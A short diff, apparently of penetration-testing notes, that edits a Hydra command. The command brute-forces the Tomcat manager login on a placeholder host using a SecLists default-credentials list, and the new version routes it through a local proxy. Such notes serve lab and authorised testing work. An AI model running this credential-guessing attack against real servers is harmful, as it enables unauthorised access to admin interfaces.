@@ -35,4 +35,4 @@ both:advagrant
 USE HYDRA
 ==========
 
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://X.X.X.X:8080/manager/html
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://X.X.X.X:8080/manager/html
